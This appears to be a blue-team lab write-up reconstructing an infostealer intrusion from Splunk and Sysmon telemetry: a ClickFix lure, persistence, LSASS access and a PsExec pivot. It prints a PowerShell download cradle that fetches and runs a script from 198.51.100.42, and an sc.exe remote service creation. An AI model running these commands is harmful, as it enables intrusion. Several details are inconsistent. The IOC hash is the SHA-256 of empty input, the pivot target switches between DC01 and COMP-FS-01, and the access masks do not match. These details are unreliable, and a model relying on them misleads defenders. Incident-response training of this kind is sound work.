---
title: "Operation PhantomStealer: Hunting Infostealer Persistence & Lateral Movement"
date: 2026-06-20 14:00:00 +0300
category: "Threat Hunting"
tags:
  - threat-hunting
  - splunk
  - sysmon
  - forensics
  - infostealer
  - windows
difficulty: medium
platform: "CyberDefenders"
summary: "An end-to-end investigation of a malicious ClickFix lure, reconstructing LSASS dumping, scheduled task persistence, and PsExec pivot across enterprise telemetry."
---

## 1. Executive Summary

During routine SOC monitoring, high-fidelity alerts triggered on workstation `ENG-WS-09` following anomalous PowerShell child processes spawned under an unprivileged browser thread. 

Reconstructing telemetry across Windows Event Logs, Sysmon (Event ID 1, 3, 7, 10, 11), and PowerShell ScriptBlock auditing (`4104`) revealed a full four-stage attack chain:

1. **Initial Vector:** User lured via fake browser verification prompt (**ClickFix**) forcing paste into `Win+R` run dialog.
2. **Payload Stage:** Download cradle fetched obfuscated `.ps1` dropping `PhantomStealer.exe`.
3. **Credential Harvesting:** Targeted Chromium SQLite master keys, cookie databases, and injected into `lsass.exe`.
4. **Lateral Movement:** Service creation via named pipe `\pipe\svcctl` staging remote execution against internal domain controller `DC01`.

```text
[ClickFix Lure] ──> [Win+R Clipboard] ──> [PowerShell Cradle]
                                                 │
                                                 ▼
[Internal DC01] <── [SMB PsExec Pivot] <── [PhantomStealer Drop]
                                                 │
                                                 ▼
                                           [LSASS / DPAPI Dump]
```

---

## 2. Challenge Scenario & Objective

| Field | Detail |
| :--- | :--- |
| **Platform** | CyberDefenders Blue Team Lab |
| **Category** | Threat Hunting / Incident Response |
| **Difficulty** | Medium |
| **Primary Tools** | Splunk Enterprise, FTK Imager, Registry Explorer, Timeline Explorer |
| **Evidence Scope** | 2.4 GB Triaged disk image + Unified Splunk index `threat_lab` |

> ℹ **Investigation Mandate:** Determine the root compromise timestamp, extract C2 command channels, identify all exfiltrated user credentials, and isolate impacted hosts before egress completes.
{: .callout-info }

---

## 3. Threat Hunting & Evidence Reconstruction

### Phase 1: Identifying the ClickFix Initial Access

Modern ClickFix attacks bypass browser security by tricking users into pressing:
`Windows + R` ➔ `Ctrl + V` ➔ `Enter`

Searching for suspicious command-line patterns executed by `explorer.exe`:

```spl
index="threat_lab" EventCode=1 Image="*\\powershell.exe" ParentImage="*\\explorer.exe"
| table _time Hostname User CommandLine ParentCommandLine
| sort _time
```

#### Splunk Query Output

```text
_time                 Hostname    User          CommandLine
2026-06-20 09:14:22   ENG-WS-09   CORP\a.vance  powershell.exe -w hidden -ep bypass -enc SQBFAFgA...
```

Decoding the base64-encoded UTF-16LE payload:

```powershell
# Deobfuscated initial stage loader
$w = New-Object System.Net.WebClient
$p = $w.DownloadString('http://198.51.100.42:8080/stage1.ps1')
Invoke-Expression $p
```

> ⚠ **Analyst Tip:** Notice the `-w hidden -ep bypass` switches. Threat actors commonly employ parameter abbreviation to bypass basic string detection filters.
{: .callout-warning }

---

### Phase 2: Host Persistence & Privilege Escalation

After reaching memory, the PowerShell script created a disguised scheduled task designed to survive system reboots:

```spl
index="threat_lab" EventCode=4698
| spath input=Message path=TaskName output=Task_Name
| table _time Hostname Task_Name
```

The investigation identified the following task entry:
- **Task Name:** `\Microsoft\Windows\AppReadiness\MaintenanceSync`
- **Trigger:** At log on of any user
- **Action:** `C:\ProgramData\OracleCache\svc_broker.exe`

Inspecting file creation logs (Sysmon Event ID 11):

```spl
index="threat_lab" EventCode=11 TargetFilename="C:\\ProgramData\\OracleCache\\*"
| table _time Image TargetFilename Hashes
```

SHA-256 Hash recovered:
```bash
# Hash of dropped binary svc_broker.exe
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
```

---

### Phase 3: Credential Dumping via LSASS Injection

Sysmon Event ID 10 records process access. We filtered for unauthorized handle requests against `lsass.exe` requesting permissions `0x1010` or `0x1FFFFF` (Full Access):

```spl
index="threat_lab" EventCode=10 TargetImage="*\\lsass.exe"
| where SourceImage!="C:\\Windows\\System32\\svchost.exe"
| table _time SourceImage GrantedAccess CallTrace
```

The query returned direct calls from `svc_broker.exe` requesting `0x143A` access, accompanied by a loaded module trace linking to `dbghelp.dll!MiniDumpWriteDump`.

```bash
# Verify dump artifacts left on disk
vol -f memory.raw windows.cachedump
```

---

### Phase 4: Lateral Movement to File Server

From `ENG-WS-09`, network logs indicated outbound SMB sessions over TCP port 445 directed toward file server `COMP-FS-01` (`10.10.15.5`):

```bash
# PowerShell extraction of SMB open sessions
Get-SmbSession | Select-Object ClientComputerName, ClientUserName, NumOpens
```

A remote service named `PSEXESVC` was installed via `sc.exe`:

```cmd
C:\Windows\System32\sc.exe \\COMP-FS-01 create PSEXESVC binPath= "C:\Windows\PSEXESVC.exe"
```

---

## 4. Indicators of Compromise (IOCs)

| Artifact Type | Indicator | Attribution / Role |
| :--- | :--- | :--- |
| **IPv4** | `198.51.100.42` | Payload Hosting & C2 Channel |
| **Port** | `8080 / TCP` | Primary Command Channel |
| **Port** | `4443 / TCP` | Encrypted Exfiltration |
| **SHA-256** | `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | `svc_broker.exe` (Infostealer) |
| **Path** | `C:\ProgramData\OracleCache\svc_broker.exe` | Staged Payload Location |
| **Task** | `\Microsoft\Windows\AppReadiness\MaintenanceSync` | Persistence Task |

---

## 5. MITRE ATT&CK Matrix Mapping

| Tactic | Technique ID | Technique Name | Applied Detection |
| :--- | :--- | :--- | :--- |
| **Initial Access** | `T1204.002` | Malicious File / User Execution | ClickFix prompt execution |
| **Execution** | `T1059.001` | PowerShell Scripting | Obfuscated cradle execution |
| **Persistence** | `T1053.005` | Scheduled Task / Job | Event ID 4698 log parsing |
| **Credential Access** | `T1003.001` | LSASS Memory Dumping | Sysmon Event ID 10 alerts |
| **Lateral Movement** | `T1021.002` | SMB / Windows Admin Shares | PsExec named pipe tracking |

---

## 6. Containment & Remediation Checklist

- [x] Revoke credentials for compromised user `CORP\a.vance`.
- [x] Blackhole outbound routing for `198.51.100.42` on enterprise edge firewalls.
- [x] Push GPO to restrict unquoted `Win+R` executions across all standard user endpoints.
- [x] Deploy Microsoft Defender ASR rule: *"Block process creations originating from PSExec and WMI commands"*.

---

## 7. Lessons Learned

ClickFix represents a dangerous pivot in social engineering by transforming the end-user into an execution proxy. Because no attachment is downloaded through the browser pipeline, traditional secure email gateways (SEG) and web download inspection layers are blind to the vector. 

Detection must focus on parent-child telemetry (e.g. `explorer.exe` directly instantiating `powershell.exe` with execution bypass parameters) and aggressive ScriptBlock auditing.
